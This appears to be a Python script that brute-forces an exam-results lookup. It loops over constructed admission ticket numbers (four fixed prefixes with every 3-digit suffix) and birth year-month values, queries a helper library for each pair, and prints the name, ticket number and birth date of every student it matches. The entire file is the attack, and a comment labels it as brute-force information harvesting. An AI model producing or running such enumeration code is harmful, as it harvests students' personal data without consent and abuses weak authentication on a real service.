import lib_fun

__author__ = 'StarDust'
#此文件主要用于考号段和出生年月的构造
#考号段7位
zkzh_nums = ["1802101","1802201","1802116","1802216"]

#出生年
birthyear = ["95","94","96","93","97","92"]


#通过程序自动生成年月数组，不用自己写，方便快捷
def getYYMM():
    #构造出生年月
    for i in birthyear:
        for j in range(1,13):
            if(j<=9):
                mm = "0" + str(j)
            else:
                mm = str(j)
            #构造的年月为
            myny = str(i) + mm
            #构造考号
            for khd in zkzh_nums:
                for weishu in range(0,1000):
                    if weishu< 10:
                        weishu = "00" + str(weishu)
                    elif weishu<100:
                        weishu = "0" + str(weishu)
                    else:
                        weishu = str(weishu)
                    #构造的考号为
                    mykh = khd + weishu

                    #暴力获取信息----------------------------------------#
                    stu_ino = lib_fun.getIno(mykh,myny)
                    check_ino = lib_fun.isAccessibleData(stu_ino)
                    #构造正确
                    if check_ino == 1:
                        stu_name = lib_fun.getName(stu_ino)
                        stu_zkzh = lib_fun.getNum(stu_ino)
                        stu_csny = myny
                        print(stu_name+"  "+stu_zkzh+"  "+stu_csny)

